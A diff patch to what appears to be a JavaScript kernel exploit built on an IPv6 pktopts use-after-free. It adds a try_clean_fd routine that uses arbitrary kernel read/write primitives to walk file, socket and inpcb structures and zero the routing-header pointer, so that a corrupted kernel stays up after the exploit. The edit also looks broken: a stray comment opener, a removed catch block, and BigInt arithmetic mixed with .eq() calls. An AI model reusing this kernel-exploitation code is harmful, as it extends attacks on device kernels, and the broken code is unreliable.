@@ -1485,8 +1485,31 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
     var  SIZEOF_OFILES = 0x8;
    var SO_PCB        = 0x18;
   var  INPCB_PKTOPTS = 0x118;
+
+
+    function try_clean_fd(fd) {
+  try {
+    // leggi struct file*
+    const filep = kmem.read64(ofiles + BigInt(fd) * BigInt(SIZEOF_OFILES));
+    if (filep.eq(0n)) return;
+    // leggi f_data = struct socket*
+    const sock_data = kmem.read64(filep);
+    if (sock_data.eq(0n)) return;
+    // leggi pcb = inpcb*
+    const pcb = kmem.read64(sock_data + BigInt(SO_PCB));
+    if (pcb.eq(0n)) return;
+    // leggi pktopts = ip6_pktopts*
+    const pktopts = kmem.read64(pcb + BigInt(INPCB_PKTOPTS));
+    if (pktopts.eq(0n)) return;
+    // azzera rthdr
+    kmem.write64(pktopts + BigInt(off_ip6po_rthdr), 0n);
+  } catch (e) {
+    // se succede panic, lo catturiamo qui per evitare crash
+    log(`skip fd ${fd}: ${e}`);
+  }
+}
  
-function intAdd(ptrInt, offset) {
+/*function intAdd(ptrInt, offset) {
   const lo = (ptrInt.lo + offset) >>> 0;
   const carry = (ptrInt.lo + offset) > 0xffffffff ? 1 : 0;
   const hi = (ptrInt.hi + carry) >>> 0;
@@ -1531,13 +1554,18 @@ for (let sd of sock_increase_ref) {
   kmem.write32(sockAddr, 0x100);                       // scrive 0x100 low‑32bit
 }
      */
-    log("full restore of pktopts and sock refcounts complete");
- }
-    catch(e){
-        alert(e.message);
-    }
+
+
+try_clean_fd(reclaim_sock);
+try_clean_fd(worker_sock);
  
+for (let i = 0; i < sds.length; i++) {
+  try_clean_fd(sds[i]);
+}
+     
     
+  
+   
  
     
     /*
